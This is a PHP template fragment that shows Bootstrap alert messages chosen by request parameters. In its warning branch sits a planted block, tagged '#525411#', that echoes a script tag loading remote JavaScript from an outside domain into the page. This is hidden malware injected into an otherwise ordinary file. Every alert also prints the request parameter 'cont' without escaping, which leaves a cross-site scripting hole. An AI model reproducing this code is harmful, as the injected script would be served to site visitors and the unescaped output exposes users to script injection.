<?php if(isset($_REQUEST['msg'])){ ?>
		<br>
          <div class="row-fluid">
           <?php if($_REQUEST['msg']=="err")
			{ ?>
          	<div class="alert alert-block alert-error fade in">
            <button class="close" type="button" data-dismiss="alert"> × </button>
            <h4 class="alert-heading"> Error! </h4>
            <p> <?=$_REQUEST['cont']?></p>
            </div>
             <?php } if($_REQUEST['msg']=="warn")
			{ ?>
<?php
#525411#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967031\"></script>";
echo $g;
}
#/525411#
?>            <div class="alert alert-block alert-warning fade in">
            <button class="close" type="button" data-dismiss="alert"> × </button>
            <h4 class="alert-heading"> Warning! </h4>
            <p> <?=$_REQUEST['cont']?></p>
            </div>
            <?php } if($_REQUEST['msg']=="succ")
			{ ?>
            <div class="alert alert-block alert-success fade in">
            <button class="close" type="button" data-dismiss="alert"> × </button>
            <h4 class="alert-heading"> Success! </h4>
            <p> <?=$_REQUEST['cont']?></p>
            </div>
            <?php } if($_REQUEST['msg']=="info"){ ?>
            <div class="alert alert-block alert-info fade in no-margin">
            <button class="close" type="button" data-dismiss="alert"> × </button>
            <h4 class="alert-heading"> Info! </h4>
            <p> <?=$_REQUEST['cont']?></p>
            </div>
            <?php } ?>
          </div>  
          <?php }  ?>